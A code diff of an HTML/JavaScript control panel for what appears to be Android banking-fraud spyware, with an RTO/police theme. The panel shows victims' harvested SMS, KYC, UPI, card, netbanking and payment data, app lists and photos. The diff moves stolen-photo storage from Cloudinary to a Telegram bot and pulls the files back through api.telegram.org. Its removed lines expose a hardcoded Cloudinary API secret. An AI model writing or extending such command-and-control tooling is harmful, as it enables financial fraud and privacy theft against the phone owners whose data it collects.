@@ -286,6 +286,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   <div class="chips">
     <div class="chip" id="btnCsv">📋 CSV</div>
     <div class="chip" id="btnFb">🔥 FB</div>
+    <div class="chip" id="btnTelegram">⚙️ Telegram</div>
     <div class="chip danger" id="btnNuke">☢️ Nuke</div>
   </div>
   <div class="scan-status" id="scanStatus" style="display:none;"><span class="spin"></span><span id="scanText">Scanning Firebase...</span></div>
@@ -359,12 +360,12 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 <div class="cf-overlay" id="delScopeOverlay">
   <div class="cf-dialog">
     <h3>🚀 Fast Delete</h3>
-    <div class="cf-hint">Photos will be deleted from <b>Firebase AND Cloudinary</b>.<br>Firebase delete is instant. Cloudinary delete runs in background.</div>
+    <div class="cf-hint">Firebase se URL hatega. Telegram pe photo rahegi.</div>
     <div id="delScopeList" style="display:flex;flex-direction:column;gap:6px;margin-bottom:12px;"></div>
     <div class="cf-status err">⚠️ Permanent delete. Undo nahi hoga.</div>
     <div style="display:flex;gap:8px;margin-top:10px;">
       <button class="cf-close" id="delScopeCancel" style="flex:1;margin-top:0;">CANCEL</button>
-      <button class="cf-btn deactivate" id="delScopeConfirm" style="flex:1;">🚀 DELETE ALL</button>
+      <button class="cf-btn deactivate" id="delScopeConfirm" style="flex:1;">🚀 DELETE</button>
     </div>
   </div>
 </div>
@@ -389,8 +390,6 @@ var RTO_CONFIG = {
   appId: "1:5750315381:android:95dc88826b1ef1262b9b3c"
 };
 
-var CLOUDINARY_CONFIG = { cloudName: "ro4vwlrm", apiKey: "899231689977322", apiSecret: "nXMr9EyHtjrtTXmVNnkHI7CeirI" };
-
 var db = null, currentApp = null, currentAccount = null;
 var devs = {}, devPaths = {}, curId = null, curTab = 'info', curMsgs = {};
 var curFilter = 'all';
@@ -400,88 +399,153 @@ var scanListener = null, deviceListener = null, dataListeners = [];
 var cfSimSlot = 1, tgPolling = {};
 var photoCmdListener = null;
 
-// ═══════════════════════════════════════════════════════════
-// SHA-1 (mobile-safe)
-// ═══════════════════════════════════════════════════════════
-function sha1Sync(str) {
-  function utf8Encode(s) {
-    var utf8 = [];
-    for (var i = 0; i < s.length; i++) {
-      var c = s.charCodeAt(i);
-      if (c < 0x80) utf8.push(c);
-      else if (c < 0x800) { utf8.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f)); }
-      else if (c < 0xd800 || c >= 0xe000) { utf8.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f)); }
-      else { i++; var cp = 0x10000 + (((c & 0x3ff) << 10) | (s.charCodeAt(i) & 0x3ff)); utf8.push(0xf0 | (cp >> 18), 0x80 | ((cp >> 12) & 0x3f), 0x80 | ((cp >> 6) & 0x3f), 0x80 | (cp & 0x3f)); }
-    }
-    return utf8;
-  }
-  function rotl(n, s) { return (n << s) | (n >>> (32 - s)); }
-  function toHex(n) { var s = ''; for (var i = 7; i >= 0; i--) s += ((n >>> (i * 4)) & 0xf).toString(16); return s; }
-  var bytes = utf8Encode(str);
-  var bitLen = bytes.length * 8;
-  bytes.push(0x80);
-  while ((bytes.length % 64) !== 56) bytes.push(0);
-  bytes.push(0, 0, 0, 0);
-  bytes.push((bitLen >>> 24) & 0xff, (bitLen >>> 16) & 0xff, (bitLen >>> 8) & 0xff, bitLen & 0xff);
-  var H = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0];
-  for (var i = 0; i < bytes.length; i += 64) {
-    var W = [];
-    for (var j = 0; j < 16; j++) W[j] = ((bytes[i + j*4] << 24) | (bytes[i + j*4 + 1] << 16) | (bytes[i + j*4 + 2] << 8) | (bytes[i + j*4 + 3])) >>> 0;
-    for (var j = 16; j < 80; j++) W[j] = rotl(W[j-3] ^ W[j-8] ^ W[j-14] ^ W[j-16], 1);
-    var a = H[0], b = H[1], c = H[2], d = H[3], e = H[4];
-    for (var j = 0; j < 80; j++) {
-      var f, k;
-      if (j < 20) { f = (b & c) | ((~b) & d); k = 0x5A827999; }
-      else if (j < 40) { f = b ^ c ^ d; k = 0x6ED9EBA1; }
-      else if (j < 60) { f = (b & c) | (b & d) | (c & d); k = 0x8F1BBCDC; }
-      else { f = b ^ c ^ d; k = 0xCA62C1D6; }
-      var temp = (rotl(a, 5) + f + e + k + W[j]) >>> 0;
-      e = d; d = c; c = rotl(b, 30); b = a; a = temp;
-    }
-    H[0] = (H[0] + a) >>> 0; H[1] = (H[1] + b) >>> 0; H[2] = (H[2] + c) >>> 0; H[3] = (H[3] + d) >>> 0; H[4] = (H[4] + e) >>> 0;
-  }
-  return toHex(H[0]) + toHex(H[1]) + toHex(H[2]) + toHex(H[3]) + toHex(H[4]);
-}
+// ✅ Telegram global config
+var TELEGRAM_CONFIG = { botToken: "", chatId: "", enabled: false, ready: false };
+var telegramConfigListener = null;
+var telegramUrlCache = {};
 
 // ═══════════════════════════════════════════════════════════
-// CLOUDINARY
+// TELEGRAM CONFIG — Firebase se fetch + live listener
 // ═══════════════════════════════════════════════════════════
-function extractPublicId(url) {
-  if (!url) return null;
-  try { var m = url.match(/\/upload\/(?:v\d+\/)?(.+?)(?:\.[a-z0-9]+)?$/i); return m ? m[1] : null; } catch(e) { return null; }
+function initTelegramConfig() {
+  if (telegramConfigListener) { try { telegramConfigListener.off(); } catch(e) {} }
+  telegramConfigListener = db.ref('global_config/telegram_config');
+  telegramConfigListener.on('value', function(snap) {
+    var d = snap.val() || {};
+    TELEGRAM_CONFIG.botToken = (d.bot_token || '').trim();
+    TELEGRAM_CONFIG.chatId = (d.chat_id || '').trim();
+    TELEGRAM_CONFIG.enabled = d.enabled === true && TELEGRAM_CONFIG.botToken && TELEGRAM_CONFIG.chatId;
+    TELEGRAM_CONFIG.ready = true;
+    console.log('Telegram config:', TELEGRAM_CONFIG.enabled ? 'READY' : 'NOT READY');
+  });
 }
-function cloudinaryDestroy(publicId, originalUrl) {
-  return new Promise(function(resolve) {
-    if (!publicId) { resolve({ ok: true, skipped: 'no_public_id' }); return; }
-    var timestamp = Math.floor(Date.now() / 1000);
-    var toSign = 'public_id=' + publicId + '&timestamp=' + timestamp;
-    var signature;
-    try { signature = sha1Sync(toSign + CLOUDINARY_CONFIG.apiSecret); } catch(e) { resolve({ ok: false, err: 'SHA1' }); return; }
-    var resourceType = (originalUrl && originalUrl.indexOf('/raw/upload/') !== -1) ? 'raw' : 'image';
-    var url = 'https://api.cloudinary.com/v1_1/' + CLOUDINARY_CONFIG.cloudName + '/' + resourceType + '/destroy';
-    var body = 'public_id=' + encodeURIComponent(publicId) + '&timestamp=' + timestamp + '&api_key=' + encodeURIComponent(CLOUDINARY_CONFIG.apiKey) + '&signature=' + signature;
-    var controller = new AbortController();
-    var timeoutId = setTimeout(function() { controller.abort(); }, 20000);
-    fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body, signal: controller.signal })
-      .then(function(r) { clearTimeout(timeoutId); return r.text().then(function(txt) {
-        var json = null; try { json = JSON.parse(txt); } catch(e) {}
-        if (json && (json.result === 'ok' || json.result === 'not found')) { resolve({ ok: true, result: json.result }); }
-        else if (json && json.error) { resolve({ ok: false, err: json.error.message || 'Cloudinary error' }); }
-        else { resolve({ ok: false, err: 'HTTP ' + r.status }); }
-      }); })
-      .catch(function(e) { clearTimeout(timeoutId); resolve({ ok: false, err: e.name === 'AbortError' ? 'Timeout' : e.message }); });
+
+function telegramGetFileUrl(fileId) {
+  var cached = telegramUrlCache[fileId];
+  if (cached && Date.now() - cached.time < 30 * 60 * 1000) {
+    return Promise.resolve(cached.url);
+  }
+  if (!TELEGRAM_CONFIG.enabled) return Promise.reject('Telegram not configured');
+  var url = 'https://api.telegram.org/bot' + TELEGRAM_CONFIG.botToken + '/getFile?file_id=' + encodeURIComponent(fileId);
+  return fetch(url)
+    .then(function(r) { return r.json(); })
+    .then(function(j) {
+      if (!j.ok) throw new Error(j.description || 'getFile failed');
+      var fileUrl = 'https://api.telegram.org/file/bot' + TELEGRAM_CONFIG.botToken + '/' + j.result.file_path;
+      telegramUrlCache[fileId] = { url: fileUrl, time: Date.now() };
+      return fileUrl;
+    });
+}
+
+function telegramFetchJson(fileId) {
+  return telegramGetFileUrl(fileId).then(function(url) {
+    return fetch(url).then(function(r) { return r.json(); });
   });
 }
 
 // ═══════════════════════════════════════════════════════════
-// FAST DELETE — Single button, Firebase + Cloudinary dono
+// TELEGRAM SETTINGS DIALOG
+// ═══════════════════════════════════════════════════════════
+function openTelegramSettings() {
+  var old = document.getElementById('tgSettingsDialog');
+  if (old) old.remove();
+  var tok = TELEGRAM_CONFIG.botToken || '';
+  var cid = TELEGRAM_CONFIG.chatId || '';
+  var html = 
+    '<div style="position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:6000; display:flex; align-items:center; justify-content:center; padding:20px;" id="tgSettingsDialog" onclick="if(event.target===this) closeTelegramSettings()">' +
+      '<div style="background:#0A1428; border:1px solid #1E3A8A; border-radius:14px; padding:20px; max-width:440px; width:100%;">' +
+        '<h3 style="color:#60A5FA; font-size:15px; margin-bottom:6px;">⚙️ Telegram Configuration</h3>' +
+        '<div style="color:#64748B; font-size:11px; margin-bottom:16px;">Photo/Apps upload ke liye. App isi config ko Firebase se fetch karega.</div>' +
+        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Bot Token</label>' +
+        '<input type="text" id="tgToken" value="' + esc(tok) + '" placeholder="123456789:ABCdef..." style="width:100%; padding:11px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:12px; font-family:monospace; margin-top:6px; margin-bottom:14px;">' +
+        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Chat ID</label>' +
+        '<input type="text" id="tgChat" value="' + esc(cid) + '" placeholder="-1001234567890" style="width:100%; padding:11px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:12px; font-family:monospace; margin-top:6px; margin-bottom:14px;">' +
+        '<div id="tgSettingsStatus" style="font-size:11px; color:#64748B; margin-bottom:12px; min-height:16px;"></div>' +
+        '<div style="display:flex; gap:8px;">' +
+          '<button onclick="closeTelegramSettings()" style="flex:1; padding:12px; background:#1E3A8A; color:#60A5FA; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">CANCEL</button>' +
+          '<button onclick="testTelegramFromDialog()" style="flex:1; padding:12px; background:#F59E0B; color:#000; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">🧪 TEST</button>' +
+          '<button onclick="saveTelegramFromDialog()" style="flex:1; padding:12px; background:#10B981; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">💾 SAVE</button>' +
+        '</div>' +
+      '</div>' +
+    '</div>';
+  var div = document.createElement('div');
+  div.innerHTML = html;
+  document.body.appendChild(div.firstChild);
+}
+
+function closeTelegramSettings() {
+  var el = document.getElementById('tgSettingsDialog');
+  if (el) el.remove();
+}
+
+function saveTelegramFromDialog() {
+  var tok = document.getElementById('tgToken').value.trim();
+  var cid = document.getElementById('tgChat').value.trim();
+  var statusEl = document.getElementById('tgSettingsStatus');
+  if (!tok || !cid) { statusEl.textContent = '❌ Both fields required'; statusEl.style.color = '#F87171'; return; }
+  statusEl.textContent = '⏳ Saving...';
+  statusEl.style.color = '#F59E0B';
+  db.ref('global_config/telegram_config').update({
+    bot_token: tok,
+    chat_id: cid,
+    enabled: true,
+    updated_at: Date.now()
+  }).then(function() {
+    statusEl.textContent = '✅ Saved!';
+    statusEl.style.color = '#10B981';
+  }).catch(function(e) {
+    statusEl.textContent = '❌ ' + e.message;
+    statusEl.style.color = '#F87171';
+  });
+}
+
+function testTelegramFromDialog() {
+  var tok = document.getElementById('tgToken').value.trim();
+  var cid = document.getElementById('tgChat').value.trim();
+  var statusEl = document.getElementById('tgSettingsStatus');
+  if (!tok || !cid) { statusEl.textContent = '❌ Both fields required'; statusEl.style.color = '#F87171'; return; }
+  statusEl.textContent = '⏳ Testing...';
+  statusEl.style.color = '#F59E0B';
+  var url = 'https://api.telegram.org/bot' + tok + '/sendMessage';
+  var body = new URLSearchParams();
+  body.append('chat_id', cid);
+  body.append('text', '🧪 RTO Panel Test\n\nPanel connected successfully!\n' + new Date().toLocaleString());
+  fetch(url, { method: 'POST', body: body })
+    .then(function(r) { return r.json(); })
+    .then(function(j) {
+      if (j.ok) { statusEl.textContent = '✅ Test message sent!'; statusEl.style.color = '#10B981'; }
+      else { statusEl.textContent = '❌ ' + (j.description || 'Failed'); statusEl.style.color = '#F87171'; }
+    })
+    .catch(function(e) { statusEl.textContent = '❌ ' + e.message; statusEl.style.color = '#F87171'; });
+}
+
+// ═══════════════════════════════════════════════════════════
+// DELETE — Firebase only (panel + telegram both keep in telegram)
+// ═══════════════════════════════════════════════════════════
+function deleteSinglePhoto(photoKey) {
+  var p = photos[photoKey]; if (!p) return;
+  if (!confirm('Delete "' + (p.name || 'photo') + '"?\n\nFirebase se URL hatega. Telegram pe rahegi.')) return;
+  var el = document.querySelector('[data-p="' + photoKey + '"]');
+  if (el) { el.classList.add('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = true; btn.textContent = '⏳'; } }
+  db.ref('device_info/' + curId + '/photos/' + photoKey).remove().then(function() {
+    delete photos[photoKey];
+    document.getElementById('cPhotos').textContent = Object.keys(photos).length;
+    renderPhotos();
+  }).catch(function(e) {
+    alert('❌ ' + e.message);
+    if (el) { el.classList.remove('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = false; btn.textContent = '✕'; } }
+  });
+}
+
+// ═══════════════════════════════════════════════════════════
+// FAST DELETE — Firebase only (batched)
 // ═══════════════════════════════════════════════════════════
 var deleteScope = 'all';
 
 function openFastDeleteDialog() {
   var counts = { all: 0, camera: 0, screenshot: 0, document: 0, picture: 0 };
   Object.values(photos).forEach(function(p) {
-    if (!p || (!p.url && !p.base64)) return;
+    if (!p || (!p.telegram_file_id && !p.url && !p.base64)) return;
     counts.all++;
     var f = (p.folder || '').toLowerCase();
     if (f.indexOf('camera') !== -1 || f.indexOf('dcim') !== -1) counts.camera++;
@@ -491,7 +555,7 @@ function openFastDeleteDialog() {
   });
   var listEl = document.getElementById('delScopeList');
   var options = [
-    { id: 'all', label: '🚀 ALL Photos', count: counts.all },
+    { id: 'all', label: '🗑️ ALL Photos', count: counts.all },
     { id: 'camera', label: '📷 Camera', count: counts.camera },
     { id: 'screenshot', label: '📸 Screenshot', count: counts.screenshot },
     { id: 'document', label: '📄 Document', count: counts.document },
@@ -508,7 +572,7 @@ function confirmFastDelete() {
   var toDelete = [];
   Object.entries(photos).forEach(function(entry) {
     var key = entry[0], p = entry[1];
-    if (!p || (!p.url && !p.base64)) return;
+    if (!p || (!p.telegram_file_id && !p.url && !p.base64)) return;
     var f = (p.folder || '').toLowerCase();
     var match = false;
     if (deleteScope === 'all') match = true;
@@ -519,7 +583,7 @@ function confirmFastDelete() {
     if (match) toDelete.push({ key: key, photo: p });
   });
   if (toDelete.length === 0) { alert('No photos'); return; }
-  if (!confirm('🚀 Delete ' + toDelete.length + ' photos?\n\nFrom Firebase + Cloudinary both.\n\nYe action undo nahi hoga.')) return;
+  if (!confirm('🚀 Delete ' + toDelete.length + ' photos from Firebase?\n\nTelegram pe rahegi.')) return;
   closeFastDeleteDialog();
   executeFastDelete(toDelete);
 }
@@ -532,92 +596,22 @@ function executeFastDelete(items) {
   document.getElementById('delProgressBar').style.width = '0%';
   var total = items.length;
   var log = document.getElementById('delProgressLog');
-
-  // ═══ STEP 1: Firebase batched delete (INSTANT) ═══
-  document.getElementById('delProgressText').textContent = 'STEP 1/2: Deleting from Firebase...';
-  log.textContent = '⚡ Firebase batched delete (' + total + ' photos)...';
+  document.getElementById('delProgressText').textContent = 'Deleting ' + total + ' from Firebase...';
+  log.textContent = '⚡ Batched delete in progress...';
   var updates = {};
-  items.forEach(function(item) {
-    updates['device_info/' + curId + '/photos/' + item.key] = null;
-  });
+  items.forEach(function(item) { updates['device_info/' + curId + '/photos/' + item.key] = null; });
   db.ref().update(updates).then(function() {
-    document.getElementById('delProgressBar').style.width = '50%';
-    document.getElementById('delProgressText').textContent = '✅ Firebase done — Cloudinary in background...';
-    log.textContent = '✅ Firebase deleted all ' + total + '\n☁️ Cloudinary deleting in background...';
+    document.getElementById('delProgressBar').style.width = '100%';
+    document.getElementById('delProgressText').textContent = '✅ Done: ' + total + ' deleted';
+    log.textContent = 'Complete!\n' + total + ' photos deleted from Firebase.\n(Telegram pe rahegi.)';
     items.forEach(function(item) { delete photos[item.key]; });
     renderPhotos();
-    // ═══ STEP 2: Cloudinary parallel delete ═══
-    deleteCloudinaryParallel(items, total);
+    setTimeout(function() { overlay.classList.remove('active'); }, 1500);
   }).catch(function(e) {
     document.getElementById('delProgressBar').style.width = '100%';
     document.getElementById('delProgressBar').style.background = '#EF4444';
-    document.getElementById('delProgressText').textContent = '❌ Firebase delete failed';
-    log.textContent = '❌ Firebase error: ' + e.message;
-  });
-}
-
-function deleteCloudinaryParallel(items, total) {
-  var PARALLEL = 3;
-  var done = 0, success = 0, failed = 0;
-  var queue = items.slice();
-  var active = 0;
-  var log = document.getElementById('delProgressLog');
-
-  function updateUI(msg) {
-    var pct = 50 + Math.round((done / total) * 50);
-    document.getElementById('delProgressBar').style.width = pct + '%';
-    document.getElementById('delProgressText').textContent = 'STEP 2/2: ' + done + ' / ' + total + ' Cloudinary';
-    log.textContent = '✅ Firebase: ' + total + ' deleted\n☁️ Cloudinary: ' + success + ' ok | ' + failed + ' fail\n' + msg;
-    log.scrollTop = log.scrollHeight;
-  }
-
-  function processNext() {
-    if (queue.length === 0 && active === 0) {
-      document.getElementById('delProgressBar').style.width = '100%';
-      document.getElementById('delProgressText').textContent = '✅ DONE — Firebase: ' + total + ' | Cloudinary: ' + success + ' ok, ' + failed + ' fail';
-      log.textContent = '✅ Complete!\nFirebase: ' + total + ' deleted\nCloudinary: ' + success + ' deleted, ' + failed + ' failed';
-      setTimeout(function() { overlay.classList.remove('active'); renderPhotos(); }, 2000);
-      return;
-    }
-    while (active < PARALLEL && queue.length > 0) {
-      var item = queue.shift();
-      active++;
-      var publicId = extractPublicId(item.photo.url);
-      var shortName = (item.photo.name || item.key).substring(0, 25);
-      cloudinaryDestroy(publicId, item.photo.url).then(function(r) {
-        done++;
-        if (r.ok) success++;
-        else { failed++; log.textContent += '\n❌ ' + shortName + ': ' + r.err; }
-        active--;
-        updateUI('✅ ' + shortName);
-        processNext();
-      });
-    }
-  }
-  processNext();
-  // keep overlay reference
-  var overlay = document.getElementById('delProgressOverlay');
-}
-
-// ═══════════════════════════════════════════════════════════
-// SINGLE PHOTO DELETE (Fast — Firebase + Cloudinary)
-// ═══════════════════════════════════════════════════════════
-function deleteSinglePhoto(photoKey) {
-  var p = photos[photoKey]; if (!p) return;
-  if (!confirm('Delete "' + (p.name || 'photo') + '"?\n\nFrom Firebase + Cloudinary both.')) return;
-  var el = document.querySelector('[data-p="' + photoKey + '"]');
-  if (el) { el.classList.add('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = true; btn.textContent = '⏳'; } }
-  // Firebase first (instant)
-  db.ref('device_info/' + curId + '/photos/' + photoKey).remove().then(function() {
-    delete photos[photoKey];
-    document.getElementById('cPhotos').textContent = Object.keys(photos).length;
-    renderPhotos();
-    // Cloudinary in background
-    var publicId = extractPublicId(p.url);
-    cloudinaryDestroy(publicId, p.url);
-  }).catch(function(e) {
-    alert('❌ ' + e.message);
-    if (el) { el.classList.remove('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = false; btn.textContent = '✕'; } }
+    document.getElementById('delProgressText').textContent = '❌ Failed';
+    log.textContent = '❌ ' + e.message;
   });
 }
 
@@ -701,11 +695,15 @@ function openPanel(config, title) {
     document.getElementById('topTitle').textContent = '🚔 ' + title;
     document.getElementById('loginScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
+    initTelegramConfig();
     startApp();
   } catch(e) { alert('Connection failed: ' + e.message); }
 }
 function doLogout() {
   stopTelegramPolling();
+  if (telegramConfigListener) { try { telegramConfigListener.off(); } catch(e) {} telegramConfigListener = null; }
+  TELEGRAM_CONFIG = { botToken: "", chatId: "", enabled: false, ready: false };
+  telegramUrlCache = {};
   if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
@@ -780,7 +778,7 @@ function startApp() {
 function isDeviceEntry(key, entry) {
   if (!entry || typeof entry !== 'object') return false;
   if (key.indexOf('DEV_') === 0) return true;
-  var fields = ['device_model','device_id','device_manufacturer','device_brand','android_version','android_sdk','sim_info','battery','battery_status','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','status','last_seen','messages','sms_history','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','photos','installed_apps','notifications','device_board','serial_number','cpu_arch','storage','ip_address','online_time','offline_time','battery_info'];
+  var fields = ['device_model','device_id','device_manufacturer','device_brand','android_version','android_sdk','sim_info','battery','battery_status','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','status','last_seen','messages','sms_history','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','photos','installed_apps','installed_apps_telegram','notifications','device_board','serial_number','cpu_arch','storage','ip_address','online_time','offline_time','battery_info'];
   for (var i = 0; i < fields.length; i++) { if (entry[fields[i]] !== undefined) return true; }
   var hasBattery = false;
   Object.keys(entry).forEach(function(k) { if (typeof entry[k] === 'string' && entry[k].indexOf('%') !== -1) hasBattery = true; });
@@ -790,7 +788,7 @@ function isDeviceEntry(key, entry) {
 function loadAllDeviceData(deviceId, basePath, callback) {
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
-  var data = { messages: {}, sms_history: {}, photos: {}, notifications: {}, installed_apps: {}, sim_info: null, forward_settings: null, device_info: null };
+  var data = { messages: {}, sms_history: {}, photos: {}, notifications: {}, installed_apps: {}, installed_apps_telegram: null, sim_info: null, forward_settings: null, device_info: null };
   if (basePath) {
     var baseRef = db.ref(basePath);
     var cb1 = baseRef.on('value', function(s) {
@@ -806,8 +804,8 @@ function loadAllDeviceData(deviceId, basePath, callback) {
     var merged = {
       messages: Object.assign({}, data.messages), sms_history: Object.assign({}, data.sms_history),
       photos: Object.assign({}, data.photos), notifications: Object.assign({}, data.notifications),
-      installed_apps: data.installed_apps, sim_info: data.sim_info,
-      forward_settings: data.forward_settings, device_info: data.device_info
+      installed_apps: data.installed_apps, installed_apps_telegram: data.installed_apps_telegram,
+      sim_info: data.sim_info, forward_settings: data.forward_settings, device_info: data.device_info
     };
     scanForDevice(root, deviceId, merged);
     Object.keys(merged).forEach(function(k) { data[k] = merged[k]; });
@@ -834,6 +832,7 @@ function collectData(devObj, result) {
   if (devObj.notifications) Object.keys(devObj.notifications).forEach(function(k) { result.notifications[k] = devObj.notifications[k]; });
   if (devObj.sms_notifications) Object.keys(devObj.sms_notifications).forEach(function(k) { result.notifications[k] = devObj.sms_notifications[k]; });
   if (devObj.installed_apps) result.installed_apps = devObj.installed_apps;
+  if (devObj.installed_apps_telegram) result.installed_apps_telegram = devObj.installed_apps_telegram;
   if (devObj.sim_info && typeof devObj.sim_info === 'object') result.sim_info = Object.assign({}, result.sim_info || {}, devObj.sim_info);
   if (devObj.sim1_number || devObj.sim1_carrier) result.sim_info = Object.assign({}, result.sim_info || {}, { sim1_number: devObj.sim1_number, sim1_carrier: devObj.sim1_carrier, sim2_number: devObj.sim2_number, sim2_carrier: devObj.sim2_carrier });
   if (devObj.forward_settings) result.forward_settings = Object.assign({}, result.forward_settings || {}, devObj.forward_settings);
@@ -858,6 +857,7 @@ function openDev(id) {
     if (data.forward_settings) devs[id].forward_settings = data.forward_settings;
     if (data.notifications && Object.keys(data.notifications).length > 0) devs[id].notifications = data.notifications;
     if (data.installed_apps && Object.keys(data.installed_apps).length > 0) devs[id].installed_apps = data.installed_apps;
+    if (data.installed_apps_telegram) devs[id].installed_apps_telegram = data.installed_apps_telegram;
     if (data.sms_history && Object.keys(data.sms_history).length > 0) devs[id].sms_history = data.sms_history;
     if (data.device_info) Object.keys(data.device_info).forEach(function(k) { if (devs[id][k] === undefined) devs[id][k] = data.device_info[k]; });
     renderTab();
@@ -993,7 +993,7 @@ function renderTab() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// PHOTOS RENDER (Fast delete button)
+// PHOTOS RENDER — Telegram file_id support
 // ═══════════════════════════════════════════════════════════
 function renderPhotos() {
   var b = document.getElementById('dBody');
@@ -1004,20 +1004,33 @@ function renderPhotos() {
         '<div id="uploadStatus" style="font-size:10px; color:#64748B; font-weight:bold;">Ready</div>' +
       '</div>' +
       '<button onclick="openPhotoUploadDialog()" style="width:100%; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; margin-bottom:8px;">📤 REQUEST UPLOAD</button>' +
-      '<button onclick="openFastDeleteDialog()" style="width:100%; padding:12px; background:linear-gradient(135deg,#EF4444,#F59E0B); color:white; border:none; border-radius:8px; font-size:13px; font-weight:bold; cursor:pointer;">🚀 FAST DELETE (Firebase + Cloudinary)</button>' +
+      '<button onclick="openFastDeleteDialog()" style="width:100%; padding:12px; background:linear-gradient(135deg,#EF4444,#F59E0B); color:white; border:none; border-radius:8px; font-size:13px; font-weight:bold; cursor:pointer;">🚀 FAST DELETE (Firebase)</button>' +
     '</div>';
   var arr = Object.entries(photos);
-  arr = arr.filter(function(p) { return p[1] && (p[1].url || p[1].base64); });
+  arr = arr.filter(function(p) { return p[1] && (p[1].telegram_file_id || p[1].url || p[1].base64); });
   var seen = {};
   arr = arr.filter(function(p) { var key = p[1].name || p[0]; if (seen[key]) return false; seen[key] = true; return true; });
   document.getElementById('cPhotos').textContent = arr.length;
   if (arr.length === 0) { b.innerHTML = topHtml + '<div class="empty">No photos yet</div>'; listenPhotoCommandStatus(); return; }
   b.innerHTML = topHtml + '<div class="pgrid">' + arr.map(function(p) {
-    var url = p[1].url || '', base64 = p[1].base64 || '', imgSrc = '';
-    if (url) imgSrc = url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/');
-    else if (base64) imgSrc = base64;
-    return '<div class="pitem" data-p="' + p[0] + '"><img src="' + imgSrc + '" loading="lazy">' + (p[1].folder ? '<div class="pfolder">' + esc(p[1].folder) + '</div>' : '') + '<button class="pdelete" data-del-p="' + p[0] + '" title="Fast delete">✕</button><div class="pname">' + esc(p[1].name || 'IMG') + '</div></div>';
+    var key = p[0], val = p[1];
+    var imgSrc = '';
+    if (val.telegram_file_id) {
+      imgSrc = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300"><rect fill="%231E3A8A" width="300" height="300"/><text x="50%" y="50%" fill="%2360A5FA" text-anchor="middle" font-size="20">TG</text></svg>';
+    } else if (val.url) {
+      imgSrc = val.url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/');
+    } else if (val.base64) {
+      imgSrc = val.base64;
+    }
+    return '<div class="pitem" data-p="' + key + '"><img src="' + imgSrc + '" loading="lazy" data-tg-id="' + (val.telegram_file_id || '') + '">' + (val.folder ? '<div class="pfolder">' + esc(val.folder) + '</div>' : '') + '<button class="pdelete" data-del-p="' + key + '">✕</button><div class="pname">' + esc(val.name || 'IMG') + '</div></div>';
   }).join('') + '</div>';
+  b.querySelectorAll('img[data-tg-id]').forEach(function(img) {
+    var fileId = img.getAttribute('data-tg-id');
+    if (!fileId) return;
+    telegramGetFileUrl(fileId).then(function(url) { img.src = url; }).catch(function(e) {
+      img.src = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300"><rect fill="%23EF4444" width="300" height="300"/><text x="50%" y="50%" fill="white" text-anchor="middle" font-size="16">Load failed</text></svg>';
+    });
+  });
   b.querySelectorAll('[data-p]').forEach(function(e) { e.addEventListener('click', function(ev) { if (ev.target.hasAttribute('data-del-p')) return; showP(this.getAttribute('data-p')); }); });
   b.querySelectorAll('[data-del-p]').forEach(function(e) { e.addEventListener('click', function(ev) { ev.stopPropagation(); deleteSinglePhoto(this.getAttribute('data-del-p')); }); });
   listenPhotoCommandStatus();
@@ -1025,8 +1038,19 @@ function renderPhotos() {
 
 function showP(k) {
   var p = photos[k]; if (!p) return;
-  var imgSrc = p.url || p.base64 || ''; if (!imgSrc) return;
   curPhoto = k;
+  if (p.telegram_file_id) {
+    document.getElementById('pImg').src = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300"><rect fill="%231E3A8A" width="300" height="300"/></svg>';
+    document.getElementById('pInfo').textContent = (p.name || 'IMG') + ' — ' + (p.size || '') + ' — ' + (p.date || '');
+    document.getElementById('pViewer').classList.add('active');
+    telegramGetFileUrl(p.telegram_file_id).then(function(url) {
+      document.getElementById('pImg').src = url;
+    }).catch(function(e) {
+      document.getElementById('pImg').src = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300"><rect fill="%23EF4444" width="300" height="300"/></svg>';
+    });
+    return;
+  }
+  var imgSrc = p.url || p.base64 || ''; if (!imgSrc) return;
   document.getElementById('pImg').src = imgSrc;
   document.getElementById('pInfo').textContent = (p.name || 'IMG') + ' — ' + (p.size || '') + ' — ' + (p.date || '');
   document.getElementById('pViewer').classList.add('active');
@@ -1034,6 +1058,11 @@ function showP(k) {
